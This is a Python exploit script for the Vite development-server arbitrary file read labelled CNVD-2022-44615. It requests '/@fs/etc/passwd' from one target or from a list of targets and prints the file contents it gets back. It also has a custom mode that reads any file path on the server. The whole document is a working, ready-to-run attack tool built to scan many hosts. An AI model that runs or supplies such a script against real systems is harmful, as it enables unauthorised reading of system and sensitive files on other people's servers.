import requests
import argparse
import urllib3
import sys


headers = {
        'user-agent':'Mozilla5.0 (Windows NT 10.0; Win64; x64) AppleWebKit537.36 (KHTML, like Gecko) Chrome103.0.0.0 Safari537.36'
    }

payload = '/@fs/etc/passwd'

def banner():
    print("CNVD-2022-44615 POC&EXP  BY NeonNOXXX")
    print("python CNVD-2022-44615.py -u http://xx.xx.xx.xx:3000(or ':5137')")


def user_input():
    target_url = input("[*]Target:")
    return target_url
    
def single_proof(target_url):
    #target_url = input("Target:")
    #print(target_url)  
    #payload = '/@fs/etc/passwd'
    urllib3.disable_warnings()
    try:
        req = requests.get(target_url + payload,headers = headers,verify = False)
        print("[+]Proving:",target_url)
        if req.status_code == 200 and 'root' in req.text:
            print('[+]' + target_url + 'is vulnerable')
            print('[+]Content:')
            print(req.text)
        else:
            print('[-]' + target_url + 'is not vulnerable.')
    except:
        print('[-]Error.')
        sys.exit(0)
        
        
def file_proof(file):
    print("[+]Proving...")
    urllib3.disable_warnings()
    with open(file,'r') as f:
        target_url = f.readlines()
        for t in target_url:
            t = t.strip('\n')
            try:
                req = requests.get(t + payload,headers = headers,verify = False)
                if req.status_code == 200 and 'root' in req.text:
                   print('[+]' + t + 'is vulnerable')
                   print('[+]Content:')
                   print(req.text)
                else:
                    print('[+]' + t + ' is not vulnerable.')
            except requests.exceptions.ConnectionError:
                print(f'[-] {t} - Connection failed')
            except requests.exceptions.Timeout:
                print(f'[-] {t} - Request timeout')
            except Exception as e:
                print(f'[-] {t} - Error: {str(e)}')

def custom_read(target_url):
    custom_file = input("[+]Input the file(like:/etc/resolv.conf):")
    target_url = target_url + '/@fs' + custom_file
    urllib3.disable_warnings()
    try:
        req = requests.get(target_url,headers = headers,verify = False)
        print("[+]Proving:",target_url)
        if req.status_code == 200:
            print('[+]' + target_url + ' is vulnerable')
            print('[+]Content:')
            print(req.text)
        else:
            print('[-]' + target_url + ' is not vulnerable.')
    except requests.exceptions.ConnectionError:
        print(f'[-] {target_url} - Connection failed')
    except requests.exceptions.Timeout:
        print(f'[-] {target_url} - Request timeout')
    except Exception as e:
        print(f'[-] {target_url} - Error: {str(e)}')

if __name__ == '__main__':
    banner()
    #single_proof(user_input())
    #file_proof('url.txt')
    parser = argparse.ArgumentParser(description = 'Vite Abitary File Reading(CNVD-2022-44615)')
    parser.add_argument('-u',action = "store",dest = "url",help = "Single URL.")
    parser.add_argument('-f',action = "store",dest = "file",help = "Read target from file.")
    parser.add_argument('-c',action = "store",dest = "custom_read",help = "Custom file reading.")
    args_opt,_ = parser.parse_known_args()
    args = parser.parse_args()
    urllib3.disable_warnings()

    if not args.url and not args.file and not args.custom_read:
        print("Specified one option:(-h/-u/-f/-c)")
        sys.exit(1)

    if args.url:
        single_proof(args.url)
    
    if args.file:
        file_proof(args.file)
    
    if args.custom_read:
        custom_read(args.custom_read)
        